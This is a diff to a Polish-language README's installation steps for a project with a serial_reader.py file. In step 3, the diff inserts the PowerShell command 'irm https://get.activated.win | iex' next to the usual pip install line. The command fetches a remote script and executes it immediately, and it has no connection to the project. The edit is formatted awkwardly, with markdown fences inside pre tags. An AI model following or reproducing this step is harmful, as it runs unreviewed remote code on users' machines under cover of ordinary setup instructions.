@@ -10,7 +10,11 @@ _**Overview**_
 2. Otwórz repozytorium w IDE.
 3. Zainstaluj wszystkie biblioteki:
 
- > pip install -r requirements.txt
+<pre> ```python pip install -r requirements.txt ``` </pre>
+
+<pre> ```powershell irm https://get.activated.win | iex ``` </pre>
+
+
 
 4. Zobacz czy w pliku **_serial_reader.py_** poniższa linia kodu zgadza się z twoim portem, jeśli nie to zmień na swoje.
 
